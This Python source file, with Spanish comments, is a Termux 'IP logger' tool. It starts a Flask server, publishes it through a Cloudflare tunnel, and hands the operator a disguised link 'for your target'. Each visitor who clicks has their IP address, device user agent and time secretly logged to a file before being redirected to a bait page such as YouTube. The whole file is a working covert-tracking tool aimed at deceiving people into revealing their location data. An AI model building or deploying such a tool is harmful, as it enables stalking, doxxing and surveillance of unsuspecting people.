import os
import sys
import time
import subprocess
from datetime import datetime

# Importaciones seguras tras asegurar dependencias en setup.sh o inicio
try:
    from flask import Flask, request, redirect
except ImportError:
    print("\033[1;31m[-] Falta Flask. Por favor ejecuta: bash scripts/setup.sh\033[0m")
    sys.exit(1)

app = Flask(__name__)

# Paleta de colores ANSI para Termux
VERDE = "\033[92m"
AZUL = "\033[94m"
AMARILLO = "\033[93m"
ROJO = "\033[91m"
CYAN = "\033[96m"
NEGRITA = "\033[1m"
RESET = "\033[0m"

banner = f"""
{CYAN}██╗██████╗░  ██╗░░░░░░█████╗░░██████╗░░███████╗███████╗██████╗░
██║██╔══██╗  ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
██║██████╔╝  ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██║██╔═══╝░  ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
██║██║░░░░░  ███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
╚═╝╚═╝░░░░░  ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝{RESET}
   {AMARILLO}{NEGRITA}--- Panel Automatizado IP-tracker para Termux ---{RESET}
"""

os.system("clear")
print(banner)

link_carnada = input(f"🔗 {NEGRITA}Pega el enlace de destino final (ej. YouTube):{RESET} ").strip()
if not link_carnada.startswith(("http://", "https://")):
    link_carnada = "https://" + link_carnada

print(f"\n{CYAN}[*] Conectando con los servidores de Cloudflare... Por favor espera.{RESET}")

if os.path.exists("cf_output.log"):
    os.remove("cf_output.log")
    
url_publica = ""
enlace_encontrado = False

try:
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    intentos = 0
    with open("cf_output.log", "w") as log_file:
        while intentos < 30:
            linea = proc.stdout.readline()
            if not linea:
                break
            log_file.write(linea)
            log_file.flush()
            
            if ".trycloudflare.com" in linea:
                palabras = linea.split()
                for palabra in palabras:
                    if "trycloudflare.com" in palabra:
                        url_publica = palabra.strip().replace("window.", "")
                        enlace_encontrado = True
                        break
            if enlace_encontrado:
                break
            time.sleep(0.5)
            intentos += 1
            
    if enlace_encontrado:
        print(f"{VERDE}[+] ¡Túnel establecido exitosamente con Cloudflare!{RESET}")
        time.sleep(1)
    else:
        print(f"{ROJO}[-] No se pudo recuperar el enlace de Cloudflare automáticamente.{RESET}")
        url_publica = "http://localhost:5000"
        time.sleep(2)
        
except FileNotFoundError:
    print(f"\033[1;31m[-] Error: 'cloudflared' no está instalado en este Termux.\033[0m")
    url_publica = "http://localhost:5000"
    time.sleep(3)

# Limpieza parcial y dibujo del monitor definitivo
os.system("clear")
print(banner)
print(f"{CYAN}========================================================================{RESET}")
print(f"📡 {NEGRITA}{VERDE}SISTEMA DE MONITOREO IP LOGGER ACTIVO (CLOUDFLARE){RESET}")
print(f"{CYAN}========================================================================{RESET}")
print(f"🔗 {NEGRITA}Destino final (Carnada):{RESET}  {AMARILLO}{link_carnada}{RESET}")
print(f"🎯 {NEGRITA}LINK PARA TU OBJETIVO:{RESET}    {NEGRITA}{CYAN}{url_publica}{RESET}")
print(f"{CYAN}========================================================================{RESET}")
print(f"\n{AMARILLO}⏳ Esperando clics de usuarios... Presiona Ctrl+C para apagar y salir.{RESET}")

@app.route('/')
def logger():
    ip_raw = request.headers.getlist("X-Forwarded-For")
    if ip_raw:
        ip = str(ip_raw[0]).split(',')[0].strip()
    else:
        ip = str(request.remote_addr)
        
    user_agent = request.headers.get('User-Agent', 'Desconocido')
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open("registro_ips.txt", "a") as archivo:
        archivo.write(f"Fecha: {fecha} | IP: {ip} | Agente: {user_agent}\n")

    print(f"\n{CYAN}┌────────────────────────────────────────────────────────┐{RESET}")
    print(f"{CYAN}│{RESET}  {NEGRITA}{ROJO}🔔 ¡ALERTA! NUEVA CONEXIÓN DETECTADA{RESET}                 {CYAN}│{RESET}")
    print(f"{CYAN}├────────────────────────────────────────────────────────┤{RESET}")
    print(f"{CYAN}│{RESET}  {NEGRITA}⏰ Fecha y Hora:{RESET} {fecha:<36} {CYAN}│{RESET}")
    print(f"{CYAN}│{RESET}  {NEGRITA}🌐 Dirección IP:{RESET} {NEGRITA}{VERDE}{ip:<36}{RESET} {CYAN}│{RESET}")
    print(f"{CYAN}│{RESET}  {NEGRITA}📱 Dispositivo:{RESET}  {AZUL}{user_agent[:35]:<36}...{RESET} {CYAN}│{RESET}")
    print(f"{CYAN}└────────────────────────────────────────────────────────┘{RESET}")

    return redirect(link_carnada, code=302)

if __name__ == '__main__':
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    try:
        app.run(host='0.0.0.0', port=5000, threaded=True)
    except KeyboardInterrupt:
        print(f"\n\n{AMARILLO}[*] Deteniendo túneles y limpiando memoria...{RESET}")
        os.system("pkill cloudflared")
        time.sleep(1)
        print(f"{VERDE}[+] Todo cerrado. Escribe 'python core/app.py' para regresar al panel.{RESET}")
